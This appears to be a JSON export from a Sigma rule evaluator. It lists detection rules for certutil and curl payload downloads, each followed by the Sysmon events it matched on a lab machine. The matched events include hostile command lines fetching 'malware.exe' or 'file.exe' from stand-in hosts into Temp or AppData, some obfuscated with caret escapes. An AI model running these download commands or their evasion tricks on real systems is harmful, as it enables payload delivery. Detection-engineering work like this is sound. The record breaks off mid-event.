[{
  "title": "Suspicious File Downloaded From Direct IP Via Certutil.EXE",
  "id": "13e6fe51-d478-4c7e-b0f2-6da9b400a829",
  "description": "Detects the execution of certutil with certain flags that allow the utility to download files from direct IPs.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\certutil.exe' ESCAPE '\\' OR OriginalFileName='CertUtil.exe') AND (CommandLine LIKE '%urlcache %' ESCAPE '\\' OR CommandLine LIKE '%verifyctl %' ESCAPE '\\') AND (CommandLine LIKE '%://1%' ESCAPE '\\' OR CommandLine LIKE '%://2%' ESCAPE '\\' OR CommandLine LIKE '%://3%' ESCAPE '\\' OR CommandLine LIKE '%://4%' ESCAPE '\\' OR CommandLine LIKE '%://5%' ESCAPE '\\' OR CommandLine LIKE '%://6%' ESCAPE '\\' OR CommandLine LIKE '%://7%' ESCAPE '\\' OR CommandLine LIKE '%://8%' ESCAPE '\\' OR CommandLine LIKE '%://9%' ESCAPE '\\')) AND (NOT CommandLine LIKE '%://7-%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.defense-evasion",
    "attack.t1027"
  ],
  "count": 3,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "certutil.exe  -urlcache -SpLIT -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "CertUtil.exe",
      "EventID": 1,
      "EventRecordID": 211824,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=1501DDD5F587BA4B487BEBF67B8BCAB3,SHA256=DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A,IMPHASH=242F130DCE7E979756BD6A1B445D7E28",
      "IMPHASH": "242F130DCE7E979756BD6A1B445D7E28",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "1501DDD5F587BA4B487BEBF67B8BCAB3",
      "Opcode": 0,
      "OriginalFileName": "CertUtil.exe",
      "OriginalLogfile": "t1012__t1012_009.evtx",
      "ParentCommandLine": "cmd.exe /c \"certutil.exe -urlcache -SpLIT -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EB19-6A2E-0916-000000002C00",
      "ParentProcessId": 12108,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EB19-6A2E-0A16-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A",
      "SystemTime": "2026-06-14T17:55:37.438794Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:55:37.435",
      "Version": 5
    },
    {
      "row_id": 4,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "certutil.exe  -UrLCACHe -\\\"split\\\" -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "CertUtil.exe",
      "EventID": 1,
      "EventRecordID": 211864,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=1501DDD5F587BA4B487BEBF67B8BCAB3,SHA256=DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A,IMPHASH=242F130DCE7E979756BD6A1B445D7E28",
      "IMPHASH": "242F130DCE7E979756BD6A1B445D7E28",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "1501DDD5F587BA4B487BEBF67B8BCAB3",
      "Opcode": 0,
      "OriginalFileName": "CertUtil.exe",
      "OriginalLogfile": "t1012__t1012_010.evtx",
      "ParentCommandLine": "cmd.exe /c \"certutil.exe -UrLCACHe -\\\"split\\\" -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EB2E-6A2E-1D16-000000002C00",
      "ParentProcessId": 7596,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EB2E-6A2E-1E16-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A",
      "SystemTime": "2026-06-14T17:55:58.258528Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:55:58.247",
      "Version": 5
    },
    {
      "row_id": 6,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "certutil.exe  -urlcache -split -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "CertUtil.exe",
      "EventID": 1,
      "EventRecordID": 211916,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=1501DDD5F587BA4B487BEBF67B8BCAB3,SHA256=DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A,IMPHASH=242F130DCE7E979756BD6A1B445D7E28",
      "IMPHASH": "242F130DCE7E979756BD6A1B445D7E28",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "1501DDD5F587BA4B487BEBF67B8BCAB3",
      "Opcode": 0,
      "OriginalFileName": "CertUtil.exe",
      "OriginalLogfile": "t1012__t1012_011.evtx",
      "ParentCommandLine": "cmd.exe /c \"certutil.exe -urlcache -split -f ftp://192.168.1.100/malware.exe C:\\ emp\\malware.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EB43-6A2E-3716-000000002C00",
      "ParentProcessId": 4540,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EB43-6A2E-3816-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A",
      "SystemTime": "2026-06-14T17:56:19.261635Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:56:19.255",
      "Version": 5
    }
  ]
},
{
  "title": "Curl Download And Execute Combination",
  "id": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
  "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((CommandLine LIKE '% -c %' ESCAPE '\\' OR CommandLine LIKE '% /c %' ESCAPE '\\' OR CommandLine LIKE '% –c %' ESCAPE '\\' OR CommandLine LIKE '% —c %' ESCAPE '\\' OR CommandLine LIKE '% ―c %' ESCAPE '\\') AND (CommandLine LIKE '%curl %' ESCAPE '\\' AND CommandLine LIKE '%http%' ESCAPE '\\' AND CommandLine LIKE '%-o%' ESCAPE '\\' AND CommandLine LIKE '%&%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.defense-evasion",
    "attack.t1218",
    "attack.command-and-control",
    "attack.t1105"
  ],
  "count": 4,
  "matches": [
    {
      "row_id": 106,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203106,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_012.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D353-6A2E-F904-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:14:11.513449Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:11.437",
      "Version": 5
    },
    {
      "row_id": 108,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203155,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_013.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D36C-6A2E-1305-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:14:36.539715Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:36.510",
      "Version": 5
    },
    {
      "row_id": 201,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207844,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_497.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E234-6A2E-450E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:17:40.914689Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:17:40.911",
      "Version": 5
    },
    {
      "row_id": 203,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207894,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_498.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E24A-6A2E-5F0E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:18:02.675608Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:02.667",
      "Version": 5
    }
  ]
},
{
  "title": "Suspicious Curl.EXE Download",
  "id": "e218595b-bbe7-4ee5-8a96-f32a24ad3468",
  "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\curl.exe' ESCAPE '\\' OR Product='The curl executable') AND ((CommandLine LIKE '%\\%AppData\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%Public\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%Temp\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%tmp\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\\\AppData\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Desktop\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Temp\\\\%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Users\\\\Public\\\\%' ESCAPE '\\' OR CommandLine LIKE '%C:\\\\PerfLogs\\\\%' ESCAPE '\\' OR CommandLine LIKE '%C:\\\\ProgramData\\\\%' ESCAPE '\\' OR CommandLine LIKE '%C:\\\\Windows\\\\Temp\\\\%' ESCAPE '\\') OR (CommandLine LIKE '%.dll' ESCAPE '\\' OR CommandLine LIKE '%.gif' ESCAPE '\\' OR CommandLine LIKE '%.jpeg' ESCAPE '\\' OR CommandLine LIKE '%.jpg' ESCAPE '\\' OR CommandLine LIKE '%.png' ESCAPE '\\' OR CommandLine LIKE '%.temp' ESCAPE '\\' OR CommandLine LIKE '%.tmp' ESCAPE '\\' OR CommandLine LIKE '%.txt' ESCAPE '\\' OR CommandLine LIKE '%.vbe' ESCAPE '\\' OR CommandLine LIKE '%.vbs' ESCAPE '\\')) AND (NOT (ParentImage LIKE 'C:\\\\Program Files\\\\Git\\\\usr\\\\bin\\\\sh.exe' ESCAPE '\\' AND Image LIKE 'C:\\\\Program Files\\\\Git\\\\mingw64\\\\bin\\\\curl.exe' ESCAPE '\\' AND (CommandLine LIKE '%--silent --show-error --output %' ESCAPE '\\' AND CommandLine LIKE '%gfw-httpget-%' ESCAPE '\\' AND CommandLine LIKE '%AppData%' ESCAPE '\\')))))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.command-and-control",
    "attack.t1105"
  ],
  "count": 33,
  "matches": [
    {
      "row_id": 99,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 202921,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_006.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D2EA-6A2E-9C04-000000002C00",
      "ParentProcessId": 8996,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D2EA-6A2E-9D04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:12:26.544027Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:26.493",
      "Version": 5
    },
    {
      "row_id": 101,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 202959,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_007.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D300-6A2E-AF04-000000002C00",
      "ParentProcessId": 108,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D300-6A2E-B004-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:12:48.777152Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:48.754",
      "Version": 5
    },
    {
      "row_id": 103,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://example.com/file.exe -o %%APPDATA%%\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203021,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_010.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D325-6A2E-CE04-000000002C00",
      "ParentProcessId": 5884,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D325-6A2E-CF04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:13:25.432920Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:25.407",
      "Version": 5
    },
    {
      "row_id": 105,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://example.com/file.exe -o %%APPDATA%%\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203061,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_011.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D33A-6A2E-E204-000000002C00",
      "ParentProcessId": 8036,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D33A-6A2E-E304-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:13:46.396841Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:46.371",
      "Version": 5
    },
    {
      "row_id": 107,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203107,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
